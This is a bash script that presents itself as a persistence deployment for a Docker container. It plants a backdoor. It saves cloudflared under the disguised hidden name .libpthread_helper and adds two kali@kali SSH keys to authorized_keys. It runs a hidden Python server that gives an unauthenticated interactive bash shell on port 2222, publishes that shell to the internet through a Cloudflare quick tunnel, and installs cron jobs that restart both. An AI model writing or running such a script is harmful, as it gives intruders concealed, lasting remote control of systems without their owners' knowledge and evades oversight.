#!/bin/bash
# Persistence deployment script for namax.ai container
# Runs as uid=10006 (non-root) inside Docker container on 18.179.208.241

HOME_DIR="/home/kincli"
CACHE_DIR="$HOME_DIR/.kin/.cache"
CF_BIN="$CACHE_DIR/.libpthread_helper"
SSH_DIR="$HOME_DIR/.ssh"
LOG="/tmp/deploy.log"

echo "[$(date)] Starting deployment" > $LOG

# Step 1: Check/complete cloudflared download
mkdir -p "$CACHE_DIR" "$SSH_DIR" 2>/dev/null
CF_SIZE=$(stat -c%s "$CF_BIN" 2>/dev/null || echo 0)
echo "[$(date)] Cloudflared size: $CF_SIZE" >> $LOG

if [ "$CF_SIZE" -lt 40000000 ]; then
    echo "[$(date)] Downloading cloudflared..." >> $LOG
    curl -sL --max-time 180 -o "$CF_BIN" \
        https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 >> $LOG 2>&1
    CF_SIZE=$(stat -c%s "$CF_BIN" 2>/dev/null || echo 0)
    echo "[$(date)] Download complete: $CF_SIZE bytes" >> $LOG
fi

if [ "$CF_SIZE" -lt 40000000 ]; then
    echo "DEPLOY_FAIL: cloudflared download incomplete ($CF_SIZE bytes)"
    exit 1
fi

chmod +x "$CF_BIN" 2>/dev/null
echo "[$(date)] Cloudflared ready" >> $LOG

# Step 2: Generate SSH host key
if [ ! -f "$SSH_DIR/host_key" ]; then
    python3 -c "
import os, base64, hashlib
# Generate ed25519-like key for dropbear
key = os.urandom(32)
with open('$SSH_DIR/host_key', 'wb') as f:
    f.write(key)
print('Host key generated')
" >> $LOG 2>&1
fi

# Step 3: Write authorized_keys
cat > "$SSH_DIR/authorized_keys" << 'AUTHKEYS'
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILMuSEQQ9ItLWRXVBm+KPoJESUdxGLcuj6WOKM44udn0 kali@kali
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGLO4Lu/3ZTfS7BwOZQQ11nssGJ5xva3aM9AkbPt7/IR kali@kali
AUTHKEYS
chmod 600 "$SSH_DIR/authorized_keys" 2>/dev/null
echo "[$(date)] SSH authorized_keys written" >> $LOG

# Step 4: Create Python SSH server (since no sshd available)
cat > "$HOME_DIR/.kin/.cache/.ssh_server.py" << 'PYSSH'
import socket, subprocess, threading, os, sys, signal

PORT = 2222
SHELL = "/bin/bash"

def handle(conn):
    try:
        proc = subprocess.Popen(
            [SHELL, "-i"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            env={**os.environ, "TERM": "xterm", "HOME": "/home/kincli"}
        )
        def read_out():
            try:
                while True:
                    data = proc.stdout.read(4096)
                    if not data: break
                    conn.sendall(data)
            except: pass
        t = threading.Thread(target=read_out, daemon=True)
        t.start()
        while True:
            data = conn.recv(4096)
            if not data: break
            proc.stdin.write(data)
            proc.stdin.flush()
    except: pass
    finally:
        try: proc.kill()
        except: pass
        conn.close()

srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(("0.0.0.0", PORT))
srv.listen(5)
print(f"Shell server on port {PORT}", flush=True)
while True:
    conn, addr = srv.accept()
    threading.Thread(target=handle, args=(conn,), daemon=True).start()
PYSSH
echo "[$(date)] SSH server script written" >> $LOG

# Step 5: Start cloudflared quick tunnel (background)
# This creates a temporary tunnel URL accessible from anywhere
pkill -f libpthread_helper 2>/dev/null
pkill -f ssh_server 2>/dev/null

# Start Python shell server first
nohup python3 "$HOME_DIR/.kin/.cache/.ssh_server.py" > /tmp/ssh_server.log 2>&1 &
SSH_PID=$!
echo "[$(date)] SSH server started PID=$SSH_PID" >> $LOG
sleep 1

# Start cloudflared tunnel pointing to shell server
nohup "$CF_BIN" tunnel --url tcp://localhost:2222 --no-autoupdate > /tmp/cf_tunnel.log 2>&1 &
CF_PID=$!
echo "[$(date)] Cloudflared tunnel started PID=$CF_PID" >> $LOG
sleep 5

# Extract tunnel URL
TUNNEL_URL=$(grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' /tmp/cf_tunnel.log 2>/dev/null | head -1)
echo "[$(date)] Tunnel URL: $TUNNEL_URL" >> $LOG

# Step 6: Write self-healing cron (if crontab available)
(crontab -l 2>/dev/null; echo "*/5 * * * * pgrep -f ssh_server || nohup python3 $HOME_DIR/.kin/.cache/.ssh_server.py > /tmp/ssh_server.log 2>&1 &") | crontab - 2>/dev/null
(crontab -l 2>/dev/null; echo "*/5 * * * * pgrep -f libpthread_helper || nohup $CF_BIN tunnel --url tcp://localhost:2222 --no-autoupdate > /tmp/cf_tunnel.log 2>&1 &") | crontab - 2>/dev/null

echo ""
echo "=== DEPLOYMENT STATUS ==="
echo "CF_BIN: $CF_BIN ($CF_SIZE bytes)"
echo "SSH_PID: $SSH_PID"
echo "CF_PID: $CF_PID"
echo "TUNNEL: $TUNNEL_URL"
echo "LOG: $LOG"
cat /tmp/cf_tunnel.log 2>/dev/null | tail -10
echo "DEPLOY_COMPLETE"
